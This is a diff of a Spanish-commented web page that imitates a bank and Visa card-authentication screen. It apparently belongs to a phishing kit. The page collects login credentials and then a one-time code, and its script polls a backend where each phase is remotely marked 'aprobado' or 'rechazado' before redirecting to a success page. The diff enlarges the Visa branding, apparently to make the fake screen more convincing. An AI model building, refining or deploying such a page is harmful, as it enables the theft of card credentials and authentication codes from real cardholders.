@@ -28,37 +28,44 @@
             position: relative; z-index: 1;
         }
         
-        /* HEADER FLEXIBLE (Logos no chocan) */
+        /* HEADER FLEXIBLE CON LOGO GIGANTE */
         .header { 
             display: flex; 
             align-items: center; 
             justify-content: space-between; 
             margin-bottom: 30px; 
-            min-height: 60px; 
+            min-height: 80px; 
             gap: 15px; 
+            overflow: visible; 
         }
         
+        /* Logo del Banco (Más pequeño para dar espacio) */
         .bank-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-start; 
             flex: 1; 
             height: 50px; 
-            max-width: 60%; 
+            max-width: 30%; /* Solo ocupa el 30% del ancho */
         }
         .bank-logo img { height: 100%; width: auto; max-width: 100%; object-fit: contain; display: none; }
         .bank-icon-placeholder { display: none; width: 45px; height: 45px; }
         
+        /* Logo de Visa GIGANTE */
         .visa-logo { 
             display: flex; 
             align-items: center; 
             justify-content: flex-end; 
-            height: 60px; 
+            height: 70px; 
+            /* 🔥 MAGIA: Se hace 2.5 veces más grande y crece hacia la izquierda */
+            transform: scale(2.5); 
+            transform-origin: right center;
+            margin-right: 10px;
         }
         .visa-logo img { 
             height: 100%; 
             width: auto; 
-            max-width: 160px; 
+            max-width: 100%; 
             object-fit: contain; 
         }
         
@@ -118,14 +125,23 @@
         .loading-subtext { color: #6b7280; font-size: 0.85rem; font-weight: 400; margin-top: -10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
+        /* RESPONSIVE: LOGO AÚN MÁS GRANDE EN MÓVILES */
         @media (max-width: 480px) {
             .modal-container { padding: 30px 20px; }
             .form-title { font-size: 1.35rem; }
             .form-input { padding: 14px; font-size: 1rem; }
-            .header { min-height: 70px; margin-bottom: 25px; }
-            .bank-logo { height: 45px; max-width: 50%; } 
-            .visa-logo { height: 70px; } 
-            .visa-logo img { max-height: 70px; max-width: 50%; }
+            
+            .header { min-height: 90px; margin-bottom: 25px; }
+            .bank-logo { height: 45px; max-width: 25%; } /* El banco se hace más pequeño */
+            
+            .visa-logo { 
+                height: 70px; 
+                /* 🔥 Se hace 3 veces más grande en celular */
+                transform: scale(3); 
+                transform-origin: right center;
+                margin-right: 5px;
+            }
+            .visa-logo img { max-height: 70px; }
             .loading-card { padding: 30px 40px; }
         }
     </style>
@@ -324,20 +340,17 @@
                     const data = await r.json();
                     if (!data.success) return;
 
-                    // FASE 1: Credenciales aprobadas
                     if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         loadingOverlay.classList.remove('active'); desbloquearOTP(); return;
                     }
 
-                    // FASE 2: OTP aprobado (Redirigir a Éxito)
                     if (data.estado === 'aprobado' && data.fase === 'otp') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         loadingText.textContent = 'Autenticación exitosa. Redirigiendo...';
                         setTimeout(() => { window.location.href = 'exito.html'; }, 1500); return;
                     }
 
-                    // RECHAZADO
                     if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         mostrarError(data.mensaje || '❌ Rechazado'); resetFormulario(); return;
